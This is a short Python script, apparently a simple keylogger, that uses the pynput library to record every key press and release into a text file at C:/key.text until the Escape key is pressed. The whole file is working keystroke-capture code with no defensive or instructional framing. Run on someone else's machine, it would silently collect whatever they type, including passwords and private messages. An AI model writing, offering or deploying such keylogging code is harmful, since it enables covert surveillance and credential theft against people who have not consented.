import os
import json

from pynput.keyboard import Key, Listener

currently_pressed_key = None

def on_press(key):
    with open(r"C:/key.text", 'a') as f:
        try:
            f.writelines('The alphanumeric key {0} pressed'.format(key.char))
            f.write("\n")
        except AttributeError:
            f.writelines('special key {0} pressed'.format(key))
def on_release(key):
    with open(r"C:/key.text", 'a') as f:
        f.writelines('{0} released'.format(key))
        f.write("\n")
        if key == Key.esc:
            # Stop listener
            return False
# Collect events until released
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

